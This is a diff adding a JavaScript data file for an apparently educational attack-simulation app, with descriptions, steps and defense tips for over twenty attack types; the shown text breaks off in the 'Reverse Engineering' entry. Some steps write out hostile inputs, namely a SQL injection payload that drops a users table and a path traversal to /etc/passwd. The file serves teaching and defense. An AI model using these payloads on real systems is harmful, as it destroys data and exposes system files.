@@ -1,0 +1,3322 @@
+/* ============================================
+   CyberShield — Attack Simulation Engine
+   ============================================ */
+
+'use strict';
+
+/* ─── ATTACK DEFINITIONS ────────────────────────────────────────────────── */
+const ATTACKS = [
+    {
+        id: 'ddos',
+        name: 'DDoS Attack',
+        icon: '🌊',
+        category: 'network',
+        severity: 'critical',
+        tags: ['volumetric', 'flood', 'botnet', 'availability'],
+        description: 'A Distributed Denial of Service (DDoS) attack overwhelms a target server by flooding it with massive traffic from thousands of compromised machines (a botnet), making the service unavailable to legitimate users.',
+        accent: '#ff3b3b',
+        accentDim: 'rgba(255,59,59,0.15)',
+        steps: [
+            { title: 'Botnet Activation', desc: 'Attacker sends command to infected zombie machines worldwide.' },
+            { title: 'Traffic Amplification', desc: 'Each bot generates thousands of requests per second.' },
+            { title: 'Server Overwhelmed', desc: 'Target server CPU and bandwidth reach 100% capacity.' },
+            { title: 'Service Disruption', desc: 'Legitimate users are unable to access the service.' },
+            { title: 'Attack Sustained', desc: 'Botnet maintains flood until manually mitigated.' },
+        ],
+        stats: [
+            { label: 'Requests/sec', value: '0', live: true },
+            { label: 'Bots Active', value: '0', live: true },
+            { label: 'Bandwidth Used', value: '0 Gbps', live: false },
+            { label: 'Server Load', value: '0%', live: false },
+        ],
+        defense: [
+            'Deploy a Content Delivery Network (CDN) with DDoS protection.',
+            'Use rate limiting and IP-based traffic filtering.',
+            'Implement anycast network diffusion to absorb traffic.',
+            'Configure auto-scaling to handle traffic spikes.',
+            'Enable blackhole routing for malicious IP ranges.',
+        ],
+        simulate: 'simulateDDoS',
+    },
+    {
+        id: 'phishing',
+        name: 'Phishing Attack',
+        icon: '🎣',
+        category: 'social',
+        severity: 'high',
+        tags: ['email', 'social-engineering', 'credential-theft', 'deception'],
+        description: 'Phishing attacks trick users into revealing credentials or installing malware by impersonating trusted entities via fraudulent emails, SMS (smishing), or websites that look identical to legitimate ones.',
+        accent: '#ffaa00',
+        accentDim: 'rgba(255,170,0,0.15)',
+        steps: [
+            { title: 'Target Reconnaissance', desc: 'Attacker researches target\'s trusted services and contacts.' },
+            { title: 'Fake Email Crafted', desc: 'Spoofed email mimics legitimate service (e.g., bank, IT).' },
+            { title: 'Email Delivered', desc: 'Victim receives email with urgent call-to-action link.' },
+            { title: 'Fake Login Page', desc: 'Victim clicks link — lands on a convincing clone site.' },
+            { title: 'Credentials Harvested', desc: 'Login credentials are stolen and sent to attacker server.' },
+        ],
+        stats: [
+            { label: 'Emails Sent', value: '0', live: true },
+            { label: 'Click Rate', value: '0%', live: false },
+            { label: 'Credentials Stolen', value: '0', live: true },
+            { label: 'Success Rate', value: '~34%', live: false },
+        ],
+        defense: [
+            'Enable Multi-Factor Authentication (MFA) on all accounts.',
+            'Train employees to identify phishing indicators.',
+            'Use email authentication (SPF, DKIM, DMARC).',
+            'Deploy an email security gateway with link analysis.',
+            'Verify URLs manually before entering any credentials.',
+        ],
+        simulate: 'simulatePhishing',
+    },
+    {
+        id: 'sql',
+        name: 'SQL Injection',
+        icon: '💉',
+        category: 'web',
+        severity: 'critical',
+        tags: ['injection', 'database', 'owasp-top-10', 'data-breach'],
+        description: 'SQL Injection (SQLi) exploits vulnerabilities in web application database queries by inserting malicious SQL code into input fields, allowing attackers to read, modify, or delete database contents.',
+        accent: '#00f0ff',
+        accentDim: 'rgba(0,240,255,0.15)',
+        steps: [
+            { title: 'Vulnerability Discovery', desc: 'Attacker finds an unsanitized input field on the web app.' },
+            { title: 'Payload Crafted', desc: 'SQL payload constructed: \' OR 1=1; DROP TABLE users; --' },
+            { title: 'Query Injected', desc: 'Malicious SQL merges with the application\'s database query.' },
+            { title: 'Database Exposed', desc: 'All user records, passwords, and PII extracted.' },
+            { title: 'Data Exfiltrated', desc: 'Attacker downloads full database via automated tools.' },
+        ],
+        stats: [
+            { label: 'Queries Tested', value: '0', live: true },
+            { label: 'Payloads', value: '0', live: true },
+            { label: 'Records Leaked', value: '0', live: true },
+            { label: 'Tables Exposed', value: '0', live: true },
+        ],
+        defense: [
+            'Use parameterized queries / prepared statements exclusively.',
+            'Apply strict input validation and sanitization.',
+            'Employ a Web Application Firewall (WAF).',
+            'Grant minimal database privileges (least privilege).',
+            'Enable database activity monitoring and alerting.',
+        ],
+        simulate: 'simulateSQLi',
+    },
+    {
+        id: 'xss',
+        name: 'Cross-Site Scripting',
+        icon: '📜',
+        category: 'web',
+        severity: 'high',
+        tags: ['xss', 'javascript', 'owasp-top-10', 'session-hijack'],
+        description: 'XSS attacks inject malicious scripts into web pages viewed by other users. Stored XSS persists in the database, reflected XSS is URL-based, and DOM-based XSS manipulates the client-side environment.',
+        accent: '#8b5cf6',
+        accentDim: 'rgba(139,92,246,0.15)',
+        steps: [
+            { title: 'Payload Injection', desc: 'Attacker submits script payload in a vulnerable form field.' },
+            { title: 'Script Stored', desc: 'Server stores malicious script without sanitization.' },
+            { title: 'Victim Loads Page', desc: 'Victim\'s browser executes the stored malicious script.' },
+            { title: 'Session Hijacked', desc: 'Script sends victim\'s session cookies to attacker.' },
+            { title: 'Account Compromised', desc: 'Attacker uses stolen cookies to impersonate the victim.' },
+        ],
+        stats: [
+            { label: 'Scripts Injected', value: '0', live: true },
+            { label: 'Users Affected', value: '0', live: true },
+            { label: 'Cookies Stolen', value: '0', live: true },
+            { label: 'Sessions Hijacked', value: '0', live: true },
+        ],
+        defense: [
+            'Implement Content Security Policy (CSP) headers.',
+            'Sanitize and encode all user-supplied data before output.',
+            'Use HttpOnly and Secure flags on session cookies.',
+            'Validate all inputs on both client and server side.',
+            'Employ modern frameworks that auto-escape by default.',
+        ],
+        simulate: 'simulateXSS',
+    },
+    {
+        id: 'ransomware',
+        name: 'Ransomware',
+        icon: '🔐',
+        category: 'malware',
+        severity: 'critical',
+        tags: ['encryption', 'extortion', 'malware', 'file-system'],
+        description: 'Ransomware encrypts a victim\'s files using strong cryptographic algorithms (e.g., AES-256 + RSA-2048), making them inaccessible, then demands a ransom payment (usually cryptocurrency) for the decryption key.',
+        accent: '#ff3b3b',
+        accentDim: 'rgba(255,59,59,0.15)',
+        steps: [
+            { title: 'Initial Infection', desc: 'Malware delivered via phishing email attachment or exploit kit.' },
+            { title: 'C2 Communication', desc: 'Ransomware contacts command & control server for encryption key.' },
+            { title: 'File Enumeration', desc: 'Scans all drives for documents, databases, and media files.' },
+            { title: 'Encryption Begins', desc: 'Files encrypted with AES-256; key encrypted with RSA-2048.' },
+            { title: 'Ransom Demanded', desc: 'Ransom note displayed. Victim has 72h to pay or lose data.' },
+        ],
+        stats: [
+            { label: 'Files Encrypted', value: '0', live: true },
+            { label: 'Data Encrypted', value: '0 GB', live: false },
+            { label: 'Ransom Demand', value: '$0', live: false },
+            { label: 'Time Elapsed', value: '0s', live: false },
+        ],
+        defense: [
+            'Maintain offline, air-gapped backups of all critical data.',
+            'Keep OS and applications fully patched and up-to-date.',
+            'Never open email attachments from unknown senders.',
+            'Use endpoint detection and response (EDR) tools.',
+            'Implement network segmentation to limit lateral movement.',
+        ],
+        simulate: 'simulateRansomware',
+    },
+    {
+        id: 'bruteforce',
+        name: 'Brute Force Attack',
+        icon: '🔨',
+        category: 'network',
+        severity: 'high',
+        tags: ['password', 'credential-stuffing', 'dictionary', 'authentication'],
+        description: 'A brute force attack systematically tries every possible password combination (or a dictionary of common passwords) until the correct one is found, exploiting weak authentication mechanisms.',
+        accent: '#ffaa00',
+        accentDim: 'rgba(255,170,0,0.15)',
+        steps: [
+            { title: 'Target Identified', desc: 'Login endpoint identified (SSH, RDP, web admin panel).' },
+            { title: 'Wordlist Loaded', desc: 'Attacker loads a dictionary of millions of common passwords.' },
+            { title: 'Automated Testing', desc: 'Tool fires thousands of login attempts per second.' },
+            { title: 'Password Found', desc: 'Weak password matched after N attempts.' },
+            { title: 'Unauthorized Access', desc: 'Attacker logs in with compromised credentials.' },
+        ],
+        stats: [
+            { label: 'Attempts Made', value: '0', live: true },
+            { label: 'Attempts/sec', value: '0', live: true },
+            { label: 'Failed Logins', value: '0', live: true },
+            { label: 'Accounts Cracked', value: '0', live: true },
+        ],
+        defense: [
+            'Enforce account lockout after 3-5 failed attempts.',
+            'Require strong, complex passwords (12+ characters).',
+            'Implement CAPTCHA on login forms.',
+            'Enable Multi-Factor Authentication (MFA).',
+            'Monitor and alert on unusual login activity patterns.',
+        ],
+        simulate: 'simulateBruteForce',
+    },
+    {
+        id: 'mitm',
+        name: 'Man-in-the-Middle',
+        icon: '👁️',
+        category: 'network',
+        severity: 'high',
+        tags: ['eavesdropping', 'interception', 'arp-spoofing', 'ssl-strip'],
+        description: 'A Man-in-the-Middle (MitM) attack secretly intercepts and relays communications between two parties, allowing the attacker to eavesdrop, steal data, or inject malicious content into the communication stream.',
+        accent: '#3b82f6',
+        accentDim: 'rgba(59,130,246,0.15)',
+        steps: [
+            { title: 'ARP Spoofing', desc: 'Attacker sends fake ARP replies to associate their MAC with victim IP.' },
+            { title: 'Position Established', desc: 'All victim traffic now routes through the attacker\'s machine.' },
+            { title: 'Traffic Interception', desc: 'Attacker reads plaintext HTTP data in real-time.' },
+            { title: 'SSL Stripping', desc: 'HTTPS downgraded to HTTP to bypass encryption.' },
+            { title: 'Data Harvested', desc: 'Credentials, session tokens, and PII captured silently.' },
+        ],
+        stats: [
+            { label: 'Packets Intercepted', value: '0', live: true },
+            { label: 'Credentials Sniffed', value: '0', live: true },
+            { label: 'Data Volume', value: '0 MB', live: false },
+            { label: 'Session Tokens', value: '0', live: true },
+        ],
+        defense: [
+            'Always use HTTPS; enforce HSTS (HTTP Strict Transport Security).',
+            'Use VPN on public or untrusted networks.',
+            'Enable certificate pinning in mobile applications.',
+            'Monitor ARP tables for unexpected changes.',
+            'Use network intrusion detection systems (NIDS).',
+        ],
+        simulate: 'simulateMitM',
+    },
+    {
+        id: 'zeroday',
+        name: 'Zero-Day Exploit',
+        icon: '💥',
+        category: 'malware',
+        severity: 'critical',
+        tags: ['exploit', 'vulnerability', 'patch', 'APT'],
+        description: 'A zero-day exploit targets a previously unknown software vulnerability, giving defenders zero days to patch before the attacker can leverage it. These are highly valuable and often used by nation-state actors.',
+        accent: '#ff00aa',
+        accentDim: 'rgba(255,0,170,0.15)',
+        steps: [
+            { title: 'Vulnerability Research', desc: 'Security researcher or attacker discovers unknown flaw in software.' },
+            { title: 'Exploit Developed', desc: 'Proof-of-concept code crafted to trigger the vulnerability.' },
+            { title: 'Silent Deployment', desc: 'Exploit delivered via watering hole, email, or supply chain.' },
+            { title: 'System Compromised', desc: 'Attacker gains system-level or root access silently.' },
+            { title: 'Persistence Installed', desc: 'Backdoor or rootkit installed; attacker maintains long-term access.' },
+        ],
+        stats: [
+            { label: 'CVE Score', value: '9.8 / 10', live: false },
+            { label: 'Systems at Risk', value: '0', live: true },
+            { label: 'Patches Available', value: '0', live: false },
+            { label: 'Time to Detect', value: '>200 days avg', live: false },
+        ],
+        defense: [
+            'Apply security patches within 24 hours of release.',
+            'Use behavior-based EDR tools to detect anomalous activity.',
+            'Deploy exploit mitigation tech (ASLR, DEP, CFG).',
+            'Implement zero-trust architecture to limit blast radius.',
+            'Perform regular threat hunting and penetration testing.',
+        ],
+        simulate: 'simulateZeroDay',
+    },
+    {
+        id: 'dns',
+        name: 'DNS Spoofing',
+        icon: '🌐',
+        category: 'network',
+        severity: 'high',
+        tags: ['dns', 'cache-poisoning', 'redirect', 'spoofing'],
+        description: 'DNS spoofing (cache poisoning) corrupts a DNS resolver\'s cache with fraudulent DNS records, redirecting users from legitimate websites to attacker-controlled servers without the user\'s knowledge.',
+        accent: '#39ff14',
+        accentDim: 'rgba(57,255,20,0.15)',
+        steps: [
+            { title: 'DNS Query Observed', desc: 'Victim\'s machine queries DNS resolver for a website IP.' },
+            { title: 'Resolver Targeted', desc: 'Attacker floods resolver with forged DNS response packets.' },
+            { title: 'Cache Poisoned', desc: 'Fake IP stored in resolver cache; legitimate users affected.' },
+            { title: 'Traffic Redirected', desc: 'All requests for target domain routed to attacker\'s server.' },
+            { title: 'Credentials Harvested', desc: 'Victims unknowingly submit credentials to fake site.' },
+        ],
+        stats: [
+            { label: 'Forged Packets', value: '0', live: true },
+            { label: 'Cache Entries', value: '0', live: true },
+            { label: 'Users Redirected', value: '0', live: true },
+            { label: 'TTL Remaining', value: '300s', live: false },
+        ],
+        defense: [
+            'Enable DNSSEC to validate DNS record authenticity.',
+            'Use trusted, encrypted DNS resolvers (DNS-over-HTTPS).',
+            'Implement source port randomization on DNS resolvers.',
+            'Monitor DNS traffic for anomalous response patterns.',
+            'Configure short TTL values on critical DNS records.',
+        ],
+        simulate: 'simulateDNSSpoofing',
+    },
+    {
+        id: 'arp',
+        name: 'ARP Poisoning',
+        icon: '☠️',
+        category: 'network',
+        severity: 'medium',
+        tags: ['arp', 'layer-2', 'lan', 'poisoning'],
+        description: 'ARP Poisoning sends falsified ARP (Address Resolution Protocol) messages over a local area network, linking the attacker\'s MAC address to the IP address of a legitimate device to intercept network traffic.',
+        accent: '#00f0ff',
+        accentDim: 'rgba(0,240,255,0.15)',
+        steps: [
+            { title: 'Network Scanning', desc: 'Attacker discovers IP and MAC addresses on the local network.' },
+            { title: 'ARP Replies Forged', desc: 'Gratuitous ARP packets sent to victim and gateway.' },
+            { title: 'ARP Cache Updated', desc: 'Victim associates gateway IP with attacker\'s MAC address.' },
+            { title: 'Traffic Intercepted', desc: 'All victim-to-gateway traffic flows through attacker.' },
+            { title: 'Data Manipulated', desc: 'Attacker reads, modifies, or drops network packets.' },
+        ],
+        stats: [
+            { label: 'ARP Packets Sent', value: '0', live: true },
+            { label: 'Hosts Poisoned', value: '0', live: true },
+            { label: 'Traffic Intercepted', value: '0 KB', live: false },
+            { label: 'Duration', value: '0s', live: false },
+        ],
+        defense: [
+            'Use Dynamic ARP Inspection (DAI) on managed switches.',
+            'Implement static ARP entries for critical hosts.',
+            'Use VLANs to segment network traffic.',
+            'Deploy network monitoring tools (e.g., XArp, Wireshark).',
+            'Encrypt all sensitive communications using TLS/VPN.',
+        ],
+        simulate: 'simulateARPPoison',
+    },
+    {
+        id: 'social',
+        name: 'Social Engineering',
+        icon: '🎭',
+        category: 'social',
+        severity: 'high',
+        tags: ['pretexting', 'vishing', 'impersonation', 'human-factor'],
+        description: 'Social engineering manipulates people into divulging confidential information or performing actions that compromise security. It exploits human psychology rather than technical vulnerabilities.',
+        accent: '#ffaa00',
+        accentDim: 'rgba(255,170,0,0.15)',
+        steps: [
+            { title: 'Target Research', desc: 'Attacker researches victim on LinkedIn, social media, and company site.' },
+            { title: 'Pretext Crafted', desc: 'Believable scenario created (e.g., IT support, new vendor, executive).' },
+            { title: 'Initial Contact', desc: 'Attacker contacts victim by phone, email, or in person.' },
+            { title: 'Trust Established', desc: 'Victim believes attacker is legitimate; guard is lowered.' },
+            { title: 'Information Extracted', desc: 'Victim reveals passwords, access codes, or sensitive data.' },
+        ],
+        stats: [
+            { label: 'Attack Vectors', value: '5', live: false },
+            { label: 'Targets Contacted', value: '0', live: true },
+            { label: 'Trust Established', value: '0', live: true },
+            { label: 'Data Extracted', value: '0', live: true },
+        ],
+        defense: [
+            'Conduct regular security awareness training for all staff.',
+            'Implement strict caller verification procedures.',
+            'Establish a security culture where questioning is encouraged.',
+            'Never share passwords verbally, even with "IT support."',
+            'Report suspicious contacts to the security team immediately.',
+        ],
+        simulate: 'simulateSocialEngineering',
+    },
+    {
+        id: 'insider',
+        name: 'Insider Threat',
+        icon: '🕵️',
+        category: 'malware',
+        severity: 'critical',
+        tags: ['insider', 'privilege-abuse', 'data-theft', 'espionage'],
+        description: 'Insider threats involve malicious or negligent actions by current/former employees, contractors, or partners who misuse their authorized access to damage systems, steal data, or sabotage operations.',
+        accent: '#ff3b3b',
+        accentDim: 'rgba(255,59,59,0.15)',
+        steps: [
+            { title: 'Authorized Access', desc: 'Insider uses legitimate credentials to access sensitive systems.' },
+            { title: 'Privilege Escalation', desc: 'Exploits role permissions to access restricted resources.' },
+            { title: 'Data Exfiltration', desc: 'Copies files to USB drive, personal email, or cloud storage.' },
+            { title: 'Evidence Destruction', desc: 'Deletes or modifies audit logs to cover tracks.' },
+            { title: 'Exfiltration Complete', desc: 'Sensitive IP, PII, or trade secrets sent to competitors/adversaries.' },
+        ],
+        stats: [
+            { label: 'Systems Accessed', value: '0', live: true },
+            { label: 'Files Exfiltrated', value: '0', live: true },
+            { label: 'Data Volume', value: '0 MB', live: false },
+            { label: 'Avg Detection Time', value: '77 days', live: false },
+        ],
+        defense: [
+            'Enforce least privilege access and role-based access control.',
+            'Implement User and Entity Behavior Analytics (UEBA).',
+            'Monitor file access logs and data egress patterns.',
+            'Conduct background checks and periodic security reviews.',
+            'Implement Data Loss Prevention (DLP) solutions.',
+        ],
+        simulate: 'simulateInsiderThreat',
+    },
+    {
+        id: 'password',
+        name: 'Password Attack',
+        icon: '🔑',
+        category: 'network',
+        severity: 'high',
+        tags: ['credential-stuffing', 'rainbow-table', 'hash-cracking', 'authentication'],
+        description: 'Password attacks use techniques like credential stuffing (leaked credentials from breaches), rainbow table lookups, and hybrid attacks to crack hashed passwords or bypass authentication at scale.',
+        accent: '#ffaa00',
+        accentDim: 'rgba(255,170,0,0.15)',
+        steps: [
+            { title: 'Credential Dump Obtained', desc: 'Attacker acquires leaked password database from dark web.' },
+            { title: 'Hash Analysis', desc: 'Password hashes extracted and identified (MD5, SHA1, bcrypt).' },
+            { title: 'Rainbow Table Lookup', desc: 'Precomputed hash tables used to reverse weak password hashes.' },
+            { title: 'Credential Stuffing', desc: 'Valid credential pairs tested across multiple services.' },
+            { title: 'Account Takeover', desc: 'Matched credentials used to access accounts across platforms.' },
+        ],
+        stats: [
+            { label: 'Hashes Analyzed', value: '0', live: true },
+            { label: 'Cracked Passwords', value: '0', live: true },
+            { label: 'Sites Tested', value: '0', live: true },
+            { label: 'Accounts Taken', value: '0', live: true },
+        ],
+        defense: [
+            'Always salt and use bcrypt/Argon2 for password hashing.',
+            'Enable credential breach monitoring (HaveIBeenPwned API).',
+            'Force password rotation after any known breach.',
+            'Implement MFA to make stolen passwords useless.',
+            'Use a password manager to generate strong unique passwords.',
+        ],
+        simulate: 'simulatePasswordAttack',
+    },
+    {
+        id: 'urlinterpret',
+        name: 'URL Interpretation',
+        icon: '🔗',
+        category: 'web',
+        severity: 'medium',
+        tags: ['url-manipulation', 'path-traversal', 'directory-listing', 'owasp'],
+        description: 'URL interpretation attacks manipulate web application URLs to access unauthorized resources. Techniques include directory traversal (../), parameter tampering, forced browsing, and path injection to bypass access controls.',
+        accent: '#3b82f6',
+        accentDim: 'rgba(59,130,246,0.15)',
+        steps: [
+            { title: 'URL Structure Analysis', desc: 'Attacker studies URL patterns to understand backend structure.' },
+            { title: 'Path Traversal Attempt', desc: 'Manipulates ../../etc/passwd to escape web root.' },
+            { title: 'Parameter Tampering', desc: 'Changes ?user_id=1001 to ?user_id=1 to access admin data.' },
+            { title: 'Forced Browsing', desc: 'Directly accesses /admin, /backup, /config without auth.' },
+            { title: 'Sensitive Data Exposed', desc: 'Config files, user data, or source code retrieved.' },
+        ],
+        stats: [
+            { label: 'URLs Probed', value: '0', live: true },
+            { label: 'Paths Traversed', value: '0', live: true },
+            { label: 'Files Accessed', value: '0', live: true },
+            { label: 'Auth Bypasses', value: '0', live: true },
+        ],
+        defense: [
+            'Validate and sanitize all URL parameters server-side.',
+            'Disable directory listing on web servers.',
+            'Implement proper access control on all endpoints.',
+            'Use allowlist-based input validation for file paths.',
+            'Configure web server to restrict traversal outside web root.',
+        ],
+        simulate: 'simulateURLInterpretation',
+    },
+    {
+        id: 'sessionhijack',
+        name: 'Session Hijacking',
+        icon: '🎫',
+        category: 'web',
+        severity: 'high',
+        tags: ['session-token', 'cookie-theft', 'fixation', 'sidejacking'],
+        description: 'Session hijacking steals or forges a user\'s session token to impersonate them without credentials. Methods include XSS cookie theft, network sniffing, session fixation, and sidejacking on unencrypted connections.',
+        accent: '#8b5cf6',
+        accentDim: 'rgba(139,92,246,0.15)',
+        steps: [
+            { title: 'Session Token Identified', desc: 'Target\'s session cookie or token observed via network sniff.' },
+            { title: 'Token Captured', desc: 'Session token extracted from HTTP headers or cookies.' },
+            { title: 'Token Replayed', desc: 'Attacker injects stolen token into their own browser.' },
+            { title: 'Identity Assumed', desc: 'Server accepts replayed token — attacker is now logged in.' },
+            { title: 'Account Exploited', desc: 'Attacker performs actions as the victim user.' },
+        ],
+        stats: [
+            { label: 'Sessions Monitored', value: '0', live: true },
+            { label: 'Tokens Captured', value: '0', live: true },
+            { label: 'Replays Attempted', value: '0', live: true },
+            { label: 'Hijacks Successful', value: '0', live: true },
+        ],
+        defense: [
+            'Regenerate session tokens after login and privilege escalation.',
+            'Set Secure + HttpOnly + SameSite flags on session cookies.',
+            'Bind sessions to IP/User-Agent to detect token theft.',
+            'Implement short session timeouts with re-authentication.',
+            'Use HTTPS everywhere to prevent network sniffing.',
+        ],
+        simulate: 'simulateSessionHijack',
+    },
+    {
+        id: 'trojan',
+        name: 'Trojan Horse',
+        icon: '🐴',
+        category: 'malware',
+        severity: 'critical',
+        tags: ['trojan', 'backdoor', 'rat', 'disguise'],
+        description: 'Trojan horses disguise malicious code as legitimate software to trick users into installing them. Once executed, they establish backdoors, exfiltrate data, or download additional malware while appearing harmless to the user.',
+        accent: '#ff3b3b',
+        accentDim: 'rgba(255,59,59,0.15)',
+        steps: [
+            { title: 'Malware Disguised', desc: 'Trojan packaged as legitimate app (game, PDF viewer, crack).' },
+            { title: 'Victim Installs', desc: 'User downloads and executes the trojanized software.' },
+            { title: 'Backdoor Opened', desc: 'Trojan silently opens a reverse shell to attacker\'s C2 server.' },
+            { title: 'System Surveilled', desc: 'Keystrokes, screenshots, and files collected without user knowledge.' },
+            { title: 'Payload Delivered', desc: 'Secondary malware (ransomware, botnet agent) downloaded and executed.' },
+        ],
+        stats: [
+            { label: 'C2 Connections', value: '0', live: true },
+            { label: 'Files Stolen', value: '0', live: true },
+            { label: 'Keystrokes Logged', value: '0', live: true },
+            { label: 'Payload Downloads', value: '0', live: true },
+        ],
+        defense: [
+            'Download software only from official, verified sources.',
+            'Use reputable antivirus/EDR with behavioral detection.',
+            'Never disable security software to install applications.',
+            'Inspect code before execution (code signing).',
+            'Monitor outbound network connections for C2 beaconing.',
+        ],
+        simulate: 'simulateTrojan',
+    },
+    {
+        id: 'driveby',
+        name: 'Drive-by Download',
+        icon: '🚗',
+        category: 'web',
+        severity: 'high',
+        tags: ['browser-exploit', 'exploit-kit', 'watering-hole', 'malvertising'],
+        description: 'Drive-by download attacks silently install malware when a user merely visits a compromised or malicious website — no user interaction required. Exploit kits probe browser and plugin vulnerabilities to deliver payloads automatically.',
+        accent: '#ff00aa',
+        accentDim: 'rgba(255,0,170,0.15)',
+        steps: [
+            { title: 'Malicious Page Loaded', desc: 'Victim browses a compromised or malvertising-infected page.' },
+            { title: 'Browser Fingerprinted', desc: 'Exploit kit probes OS, browser version, and plugin vulnerabilities.' },
+            { title: 'Exploit Triggered', desc: 'Vulnerable component (Flash, PDF, JS engine) exploited silently.' },
+            { title: 'Payload Dropped', desc: 'Malware silently downloaded and written to disk without prompts.' },
+            { title: 'Malware Executes', desc: 'Payload runs with browser privileges; system compromised.' },
+        ],
+        stats: [
+            { label: 'Pages Visited', value: '0', live: true },
+            { label: 'Exploits Attempted', value: '0', live: true },
+            { label: 'Payloads Dropped', value: '0', live: true },
+            { label: 'Systems Infected', value: '0', live: true },
+        ],
+        defense: [
+            'Keep browsers and all plugins fully updated.',
+            'Use ad-blockers and disable unnecessary browser plugins.',
+            'Enable browser sandboxing and click-to-play for plugins.',
+            'Use DNS filtering to block known malicious domains.',
+            'Deploy endpoint protection with exploit mitigation.',
+        ],
+        simulate: 'simulateDriveBy',
+    },
+    {
+        id: 'eavesdropping',
+        name: 'Eavesdropping',
+        icon: '👂',
+        category: 'network',
+        severity: 'medium',
+        tags: ['sniffing', 'packet-capture', 'wireshark', 'passive'],
+        description: 'Eavesdropping (network sniffing) passively captures network traffic to extract sensitive data from unencrypted communications. Unlike active attacks, it leaves no trace on targeted systems and is extremely difficult to detect.',
+        accent: '#39ff14',
+        accentDim: 'rgba(57,255,20,0.15)',
+        steps: [
+            { title: 'NIC Promiscuous Mode', desc: 'Attacker sets network card to capture all passing frames.' },
+            { title: 'Packet Capture Started', desc: 'Tool (Wireshark/tcpdump) records all network traffic.' },
+            { title: 'Protocol Analysis', desc: 'HTTP, FTP, Telnet traffic analyzed for plaintext credentials.' },
+            { title: 'Data Extraction', desc: 'Passwords, emails, and session tokens extracted from captures.' },
+            { title: 'Offline Analysis', desc: 'Captured data analyzed at leisure without detection risk.' },
+        ],
+        stats: [
+            { label: 'Packets Captured', value: '0', live: true },
+            { label: 'Credentials Found', value: '0', live: true },
+            { label: 'Data Volume', value: '0 MB', live: false },
+            { label: 'Protocols Sniffed', value: '0', live: true },
+        ],
+        defense: [
+            'Encrypt all network communications (TLS 1.3, WPA3).',
+            'Avoid using legacy plaintext protocols (FTP, Telnet, HTTP).',
+            'Use network switches instead of hubs to limit broadcast.',
+            'Implement 802.1X port-based authentication on LANs.',
+            'Monitor for promiscuous mode NICs on the network.',
+        ],
+        simulate: 'simulateEavesdropping',
+    },
+    {
+        id: 'birthday',
+        name: 'Birthday Attack',
+        icon: '🎂',
+        category: 'web',
+        severity: 'medium',
+        tags: ['cryptography', 'hash-collision', 'md5', 'probability'],
+        description: 'A birthday attack exploits the mathematics of the birthday paradox to find hash collisions faster than brute force. It\'s used to forge digital signatures, break weak hash functions (MD5, SHA-1), and create malicious certificate duplicates.',
+        accent: '#ff00aa',
+        accentDim: 'rgba(255,0,170,0.15)',
+        steps: [
+            { title: 'Hash Function Targeted', desc: 'Attacker identifies weak hash algorithm in use (MD5, SHA-1).' },
+            { title: 'Random Inputs Generated', desc: 'Millions of random messages computed and hashed.' },
+            { title: 'Collision Search', desc: 'Birthday paradox: collision found after ~√N computations.' },
+            { title: 'Collision Found', desc: 'Two different inputs with identical hashes discovered.' },
+            { title: 'Signature Forged', desc: 'Digital signature or certificate forged using the collision.' },
+        ],
+        stats: [
+            { label: 'Hashes Computed', value: '0', live: true },
+            { label: 'Collisions Found', value: '0', live: true },
+            { label: 'Hash Space', value: '2^128 bits', live: false },
+            { label: 'Forge Success', value: '0%', live: false },
+        ],
+        defense: [
+            'Use SHA-256 or stronger hash functions.',
+            'Migrate away from MD5 and SHA-1 immediately.',
+            'Use digital signatures with collision-resistant algorithms.',
+            'Implement certificate transparency to detect forged certs.',
+            'Regularly audit cryptographic implementations for weaknesses.',
+        ],
+        simulate: 'simulateBirthdayAttack',
+    },
+    {
+        id: 'malware',
+        name: 'Malware Infection',
+        icon: '🦠',
+        category: 'malware',
+        severity: 'critical',
+        tags: ['worm', 'virus', 'spyware', 'payload'],
+        description: 'Malware (malicious software) encompasses viruses, worms, spyware, and adware that self-replicate, spread laterally, and cause damage. Unlike targeted attacks, malware campaigns propagate automatically across networks seeking vulnerable hosts.',
+        accent: '#ff3b3b',
+        accentDim: 'rgba(255,59,59,0.15)',
+        steps: [
+            { title: 'Initial Infection Vector', desc: 'Malware enters via email, USB, exploited vulnerability.' },
+            { title: 'Self-Replication', desc: 'Worm/virus copies itself to other files or network shares.' },
+            { title: 'Lateral Movement', desc: 'Spreads to adjacent networked systems automatically.' },
+            { title: 'Payload Activation', desc: 'Destructive payload: data corruption, crypto-mining, exfil.' },
+            { title: 'Propagation', desc: 'Infected systems become vectors — spreading further.' },
+        ],
+        stats: [
+            { label: 'Systems Infected', value: '0', live: true },
+            { label: 'Files Corrupted', value: '0', live: true },
+            { label: 'Network Spread', value: '0', live: true },
+            { label: 'Propagation Speed', value: '0/s', live: false },
+        ],
+        defense: [
+            'Deploy enterprise antivirus with real-time protection.',
+            'Segment networks to prevent lateral movement.',
+            'Disable autorun for removable media.',
+            'Keep all software and OS patches current.',
+            'Use application whitelisting to block unauthorized code.',
+        ],
+        simulate: 'simulateMalware',
+    },
+    {
+        id: 'honeypot',
+        name: 'Honeypot Trap',
+        icon: '🍯',
+        category: 'network',
+        severity: 'low',
+        tags: ['deception', 'threat-intel', 'honeypot', 'detection'],
+        description: 'A honeypot is a deliberately vulnerable decoy system designed to lure attackers, observe their techniques, and gather threat intelligence — without exposing real assets. Honeynets extend this concept to entire fake network segments.',
+        accent: '#ffaa00',
+        accentDim: 'rgba(255,170,0,0.15)',
+        steps: [
+            { title: 'Decoy Deployed', desc: 'Honeypot server appears as a vulnerable, attractive target.' },
+            { title: 'Attacker Detected', desc: 'Any connection to honeypot triggers immediate alert.' },
+            { title: 'Attack Profiled', desc: 'Attacker\'s tools, techniques, and IPs logged silently.' },
+            { title: 'Threat Intel Gathered', desc: 'Attack patterns analyzed and fed into security systems.' },
+            { title: 'Attacker Contained', desc: 'Attacker wasted on fake system; real assets remain safe.' },
+        ],
+        stats: [
+            { label: 'Connections Lured', value: '0', live: true },
+            { label: 'Attack Patterns', value: '0', live: true },
+            { label: 'IPs Captured', value: '0', live: true },
+            { label: 'Real Assets Safe', value: '100%', live: false },
+        ],
+        defense: [
+            'Deploy honeypots across network segments as early warning.',
+            'Use high-interaction honeypots to gather rich attacker data.',
+            'Integrate honeypot alerts into your SIEM system.',
+            'Position honeypots alongside real assets for credibility.',
+            'Analyze honeypot logs regularly to update threat intelligence.',
+        ],
+        simulate: 'simulateHoneypot',
+    },
+    {
+        id: 'reverseeng',
+        name: 'Reverse Engineering',
+        icon: '🔬',
+        category: 'malware',
+        severity: 'medium',
+        tags: ['disassembly', 'decompilation', 'binary-analysis', 'debugging'],
